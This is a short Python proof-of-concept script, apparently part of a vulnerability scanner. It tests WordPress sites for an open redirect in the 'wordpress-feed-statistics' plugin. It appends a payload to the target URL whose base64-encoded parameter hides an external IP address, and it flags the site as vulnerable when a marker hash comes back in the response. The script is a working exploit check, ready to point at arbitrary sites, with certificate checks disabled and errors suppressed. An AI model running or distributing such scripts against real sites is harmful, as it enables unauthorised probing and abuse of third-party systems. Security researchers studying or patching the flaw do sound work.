#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress插件跳转
referer: unknown
author: Lucifer
description: feed-statistics.php中参数url未经过验证可跳转任意网站。
'''
import sys
import requests
import warnings




def poc(url):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/wp-content/plugins/wordpress-feed-statistics/feed-statistics.php?url=aHR0cDovLzQ1Ljc2LjE1OC45MS9zc3Jm"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"100e8a82eea1ef8416e585433fd8462e" in req.text:
            # cprint("[+]存在wordpress插件跳转漏洞...(低危)\tpayload: "+vulnurl, "blue")
            return {'payload': vulnurl, 'post_data': '', 'info': ''}
        else:
            pass

    except:
        pass

